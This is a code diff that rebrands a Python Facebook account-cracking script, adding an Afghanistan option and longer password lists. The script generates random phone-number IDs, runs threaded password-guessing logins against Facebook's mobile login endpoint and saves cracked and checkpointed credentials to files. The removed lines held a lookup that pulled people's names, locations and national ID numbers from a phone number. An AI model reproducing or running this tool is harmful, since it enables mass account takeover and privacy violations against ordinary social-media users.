@@ -1,4 +1,4 @@
-#Rimon
+#Shipu
 
 
 
@@ -78,7 +78,7 @@ b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
 asu = random.choice([m,k,h,u,b])
 try:
-	prox= requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/.prox.txt').text
+	prox= requests.get('https://github.com/shipukhan2001/Sk_Shipu/blob/main/Sk_Shipu.txt').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
 	print('\x1b[1;95m[√] LOADING...')
@@ -152,19 +152,24 @@ awan =[
 
 A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
 
-logo=(""" \033[1;92m
-RRRRRR  IIIII MM    MM  OOOOO  NN   NN 
-RR   RR  III  MMM  MMM OO   OO NNN  NN 
-RRRRRR   III  MM MM MM OO   OO NN N NN 
-RR  RR   III  MM    MM OO   OO NN  NNN 
-RR   RR IIIII MM    MM  OOOO0  NN   NN
-\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mDEVELOPER\033[1;97m ●   \33[1;92mRIMON AHMED    
-\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mFACEBOOK\033[1;97m  ●   \33[1;92mMD RIMON    
-\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mGITHUB\033[1;97m    ●   \33[1;92mRIMON-143
-\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mVERSION\033[1;97m   ●   \33[1;92m2.2
-\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mTOOLS\033[1;97m     ●   \033[1;91m\033[1;41m\033[1;97mFILE/RANDOM\033[;0m\033[1;91m\033[1;92m   
-\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+logo=(f'''{B}\033[0;92m
+:'######::'##::::'##:'####:'########::'##::::'##:
+'##... ##: ##:::: ##:. ##:: ##.... ##: ##:::: ##:
+ ##:::..:: ##:::: ##:: ##:: ##:::: ##: ##:::: ##:
+. ######:: #########:: ##:: ########:: ##:::: ##:
+:..... ##: ##.... ##:: ##:: ##.....::: ##:::: ##:
+'##::: ##: ##:::: ##:: ##:: ##:::::::: ##:::: ##:
+. ######:: ##:::: ##:'####: ##::::::::. #######::
+:......:::..:::::..::....::..::::::::::.......:::
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[0;45m      [ TOOLS CREATED BY : SHIPU KHAN! ]     \033[0;92m║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[0;42mTOOLS      :   RANDOM/FILE\033[0;92m     \33[0;41mFIRE\033[0;92m          ║
+║\33[0;41mVERSION    :   4.9 \033[0;92m                          ║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+
+--------------------------------------------{B}''')
 def linex():
 	print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 loop = 0
@@ -184,9 +189,9 @@ def menu():
 			print('[1] File Cloning menu')
 			print('[2] Pak Random Cloning menu')
 			print('[3] BD  Random Cloning menu')
-			print('[4] Random Choice Pass ')
-			print('[5] Get any  number data')
-			print('[6] Get any CNIC number data')
+			print('[4] Afg  Random Cloning menu ')
+			print('[5] Random Choice Pass ')
+			print('[6] Old Uid Cloning {Upcoming} ')
 			print('[7] Follow me on Facebook')
 			print('\x1b[1;91m[8] Exit main menu')
 			linex()
@@ -196,17 +201,19 @@ def menu():
 				print(logo)
 				
 				linex()
-				print(' Example : /sdcard/NOOB.txt')
+				print(' Example : /sdcard/Shipu.txt')
 				linex()
 				file = input(' Put file path\033[1;37m: ')
+				os.system("espeak \"Put your file name \"")
 				try:
 					fo = open(file,'r').read().splitlines()
 				except FileNotFoundError:
-					print(' File location not found ')
+					print(' File location not found {os.system{"espeak \"File Not Found \""} ')
 					time.sleep(1)
 					menu()
 				os.system('clear')
 				print(logo)
+				os.system("espeak \"Choice method \"")
 				print('[1] File Method\x1b[1;92m [1] \n\x1b[1;97m[2] File Method \x1b[1;92m[2]')
 				linex()
 				mthd=input(' Choose: ')
@@ -215,7 +222,7 @@ def menu():
 				try:
 					os.system('clear')
 					print(logo)
-					print(' Example : 1 , 2 ,3, 4 ,5 ,6 ,7 ,8, 9 ,****,Etc')
+					print(' Example : 1 , 2 ,3, 4 ,5 ,6 ,7 ,8, 9 ,10,Etc')
 					linex()
 					ps_limit = int(input(' Putt pass lemit : '))
 				except:
@@ -264,13 +271,13 @@ def menu():
 			elif rifat in ['3','03']:
 				bd()
 			elif rifat in ['4','04']:
-				chos()
-			elif rifat in ['5','05']:
 				zong()
+			elif rifat in ['5','05']:
+				chos()
 			elif rifat in ['6','06']:
 				cinc()
 			elif rifat in ['7','07']:
-				os.system('xdg-open https://www.facebook.com/Abal.Not.Allow.143');menu()
+				os.system('xdg-open https://www.facebook.com/shipukhan72');menu()
 			elif rifat in ['8','08']:
 				exit('')
 			else:
@@ -278,7 +285,7 @@ def menu():
 		
 def mmm(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mRimon\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mShipu\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -304,15 +311,15 @@ def mmm(ids,names,passlist):
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				
-				print('\033[1;92m[Rimon-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/Rimon-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[Shipu-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/Shipu-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
 					
-					print('\33[1;31m[Rimon-CP] '+ids+' | '+pas+'\33[0;97m')
-					open('/sdcard/Rimon-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\33[1;31m[Shipu-CP] '+ids+' | '+pas+'\33[0;97m')
+					open('/sdcard/Shipu-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -375,8 +382,8 @@ def ffb(ids,names,passlist):
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\033[1;92m[Rimon-OK-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/Rimon-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[Shipu-OK-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/Shipu-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
@@ -430,7 +437,7 @@ def random_number1():
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print(' Example : 1000,5000,10000,****Etc')
+	print(' Example : 1000,5000,10000,50000')
 	linex()
 	limit = int(input('[+] Putt Ypur Idz lemit :  '))
 	for nmbr in range(limit):
@@ -450,7 +457,7 @@ def random_number1():
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
+	print('[?] Idz saved in [Shipu-ok.txt,Shipu-cp.txt]')
 	linex()
 	input('Press Enter To Go Back To Menu')
 	menu()
@@ -465,7 +472,7 @@ def random_number2():
 	os.system('clear')
 	print(logo)
 	linex()
-	print(' Example : 1000,5000,10000,****Etc')
+	print(' Example : 1000,5000,10000,50000')
 	limit = int(input('[+] Putt Ypur Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -484,7 +491,7 @@ def random_number2():
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
+	print('[?] Idz saved in [Shipu-ok.txt,Shipu-cp.txt]')
 	linex()
 	input('Press Enter To Go Back To Menu')
 	menu()
@@ -520,7 +527,7 @@ def random_number3():
 	os.system('clear')
 	print(logo)
 	linex()
-	print(' Example : 1000,5000,10000,****Etc')
+	print(' Example : 1000,5000,10000,50000')
 	limit = int(input('[+] Putt Ypur Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -554,7 +561,7 @@ def random_number4():
 	os.system('clear')
 	print(logo)
 	linex()
-	print(' Example : 1000,5000,10000,****Etc')
+	print(' Example : 1000,5000,10000,50000')
 	limit = int(input('[+] Putt Ypur Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -588,7 +595,7 @@ def random_number5():
 	os.system('clear')
 	print(logo)
 	linex()
-	print(' Example : 1000,5000,10000,****Etc')
+	print(' Example : 1000,5000,10000,50000')
 	limit = int(input('[+] Putt Ypur Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -607,7 +614,7 @@ def random_number5():
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
+	print('[?] Idz saved in [Shipu-ok.txt,Shipu-cp.txt]')
 	linex()
 	input('Press Enter To Go Back To Menu')
 	menu()
@@ -622,7 +629,7 @@ def random_number6():
 	os.system('clear')
 	print(logo)
 	linex()
-	print(' Example : 1000,5000,10000,****Etc')
+	print(' Example : 1000,5000,10000,50000')
 	limit = int(input('[+] Putt Ypur Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -641,7 +648,7 @@ def random_number6():
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
+	print('[?] Idz saved in [Shipu-ok.txt,Shipu-cp.txt]')
 	linex()
 	input('Press Enter To Go Back To Menu')
 	menu()
@@ -650,12 +657,12 @@ def bd1():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE : 88***,88***,88***,.ETC')
+	print('[√] EXAMPLE : 88017,88018,88019,.ETC')
 	linex()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print(' Example : 1000,5000,10000,****Etc')
+	print(' Example : 1000,5000,10000,50000')
 	limit = int(input('[+] Putt Ypur Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -674,7 +681,7 @@ def bd1():
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
+	print('[?] Idz saved in [Shipu-ok.txt,Shipu-cp.txt]')
 	linex()
 	input('Press Enter To Go Back To Menu')
 	menu()
@@ -684,12 +691,12 @@ def bd2():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE : 88***,88***,88***,.ETC')
+	print('[√] EXAMPLE : 88017,88018,88019,.ETC')
 	linex()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print(' Example : 1000,5000,10000,****Etc')
+	print(' Example : 1000,5000,10000,50000')
 	limit = int(input('[+] Putt Ypur Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -704,7 +711,7 @@ def bd2():
 		linex()
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,kode,'free fire','bangladish','freefire']
+			pwx = [guru,kode,'free fire','bangladish','freefire','jannat','nusrat','i love you']
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
@@ -717,12 +724,12 @@ def bd3():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE : 88***,88***,88***,.ETC')
+	print('[√] EXAMPLE : 88017,88018,88019,.ETC')
 	linex()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print(' Example : 1000,5000,10000,****Etc')
+	print(' Example : 1000,5000,10000,50000')
 	limit = int(input('[+] Putt Ypur Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -737,7 +744,7 @@ def bd3():
 		linex()
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,kode,'puja12','islam12345','islam1122']
+			pwx = [guru,kode,'puja12','islam12345','islam1122','jannat','nusrat','i love you','freefire']
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
@@ -759,7 +766,7 @@ def chos():
     linex()
     os.system('clear')
     print(logo)
-    print('[+] Example : 1000,5000,10000,****Etc')
+    print('[+] Example : 1000,5000,10000,50000')
     linex()
     limit = int(input('[+] Idz lemit :  '))
     for nmbr in range(limit):
@@ -767,13 +774,13 @@ def chos():
         user.append(nmp)
     os.system("clear")
     print(logo)
-    print('[+] Example :  1,2,3,4,5,6,7,8,9**,Etc')
+    print('[+] Example :  1,2,3,4,5,6,7,8,9,10,Etc')
     linex()
     passx = int(input("[*] Enter Password Limit : "))
     HamiiID = []
     os.system('clear')
     print(logo)
-    print('[+] Example : khan12345,bangladish,baloch,***Etc')
+    print('[+] Example : khan1234,bangladish,freefire,jannat,nusrat Etc')
     linex()
     for bilal in range(passx):
         pww = input(f"[*] Enter Password {bilal+1} : ")
@@ -795,7 +802,7 @@ def chos():
             manshera.submit(fcrack,uid,pwx,tl)
     linex()
     print('Crack process has been completed')
-    print('Ids saved in ok.txt,cp.txt')
+    print('Ids saved in Shipu-ok.txt,Shipu.txt')
     linex()
 
 #_
@@ -825,24 +832,23 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'p.facebook.com',
-			'upgrade-insecure-requests': '1',
-			'viewport-width': '980',
-			'method': 'GET',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7', 
-			'dnt':'1', 
-			'x-requested-with':'mark.via.gp', 
-			'sec-fetch-site': 'none',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-user': '?1',
-			'sec-fetch-dest': 'document',
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="105"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
-			"sec-ch-prefers-color-scheme": "light",
+			header_freefb = {'authority': 'p.facebook.com',
+ 		   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  		  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+		    'cache-control': 'max-age=0',
+		    'dpr': '2.75',
+ 		   'sec-ch-prefers-color-scheme': 'dark',
+		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+ 		   'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+  		  'sec-ch-ua-mobile': '?1',
+		    'sec-ch-ua-model': '"22111317PI"',
+		    'sec-ch-ua-platform': '"Android"',
+		    'sec-ch-ua-platform-version': '"13.0.0"',
+ 		   'sec-fetch-dest': 'document',
+		    'sec-fetch-mode': 'navigate',
+		    'sec-fetch-site': 'none',
+ 		   'sec-fetch-user': '?1',
+  		  'upgrade-insecure-requests': '1',
 			'user-agent': ua}
 			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
@@ -850,15 +856,15 @@ def fcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m[Rimon-OK] '+cid+' | '+ps+'\033[1;32m')
-				open('Rimon-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				print('\033[1;92m[Shipu-OK] '+cid+' | '+ps+'\033[1;32m')
+				open('Shipu-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\33[1;31m[Rimon-CP] '+cid+' | '+ps+'\33[0;97m')
-				open('Rimon-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				print('\33[1;31m[Shipu-CP] '+cid+' | '+ps+'\33[0;97m')
+				open('Shipu-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
@@ -940,36 +946,36 @@ def cinc():
 def zong():
     os.system('clear')
     print(logo)
-    print(' Example : 03*********,030******,Etc')
-    linex()
-    num = input(f" Put number :\033[1;32m ")
-    if num[0] == '0':
-        nmbr = num.replace("03","3")
-    else:
-        nmbr = num
-    head = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36', 'Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded'}
-    data = {'cnnum': nmbr}
-    url = requests.post('https://freepicccs.com/search-result2.php',headers=head,data=data)
-    dta = re.findall("\<div(.*?)</table>",str(url.text))
-    open(".tt1.txt","w").write(str(dta))
-    ndt = open(".tt1.txt","r").read()
-    ndt = ndt.replace("</strong>","<strong>")
-    ndt = ndt.split("<strong>")
-    try:
-        linex()
-        try:print(f" \033[1;37mMobile num : \033[1;37m{ndt[1]}")
-        except:pass
-        try:print(f"\033[1;37m Name       : \033[1;37m{ndt[5].lower()}")
-        except:pass
-        try:print(f"\033[1;37m Location   : \033[1;37m{ndt[9].lower()}")
-        except:pass
-        try:print(f"\033[1;37m Cnic Num   : \033[1;37m{ndt[7]}")
-        except:pass
-        linex()
-    except:
-        print(' Sorry Data not Found ')
-    input('\033[1;91m Go to main menu :')
-    linex()
-    exit()
+    print('\33[1;31m CHOOSE CODE : 9370, 9378, 9377, 9379, 9374')
+    lines()
+    kode = input(' PUT CODE : ')
+    lines()
+    os.system('clear')
+    print(logo)
+    print(' \33[1;31mEXAMPLE : 2000,3000,5000,10000')
+    lines()
+    limit = int(input(' IDZ LEMIT : '))
+    print(46*'-')
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=70) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print('\33[1;31m TOTAL ACOUNTS : '+tl)
+        print('\33[1;31m SELECTED CODE :\x1b[1;92m '+kode)
+        print('\x1b[1;92m USE FLIGHT MODE FOR SPEED UP')
+        lines()
+        for guru in user:
+            uid = kode+guru
+            pwx=[guru+guru,'Û±Û²Û³Û´ÛµÛ¶','500500','900900','12345678','10002000','50006000','kabul123','Afghan12345','Afghan123','Afghanistan','Û±Û²Û³Û´ÛµÛ¶Û·Û¸Û¹']
+            yaari.submit(rcrack,uid,pwx,tl)
+    print(46*'-')
+    print('IDZ SAVED IN Shipu-Afg-OK.txt : Shipu-Afg-CP.txt')
+    print(46*'-')
+    print('THE PROCESS HAS BEEN COMPLETED')
+    input('PRESS ENTER TO BACK ')
+    zong()
     
 menu()
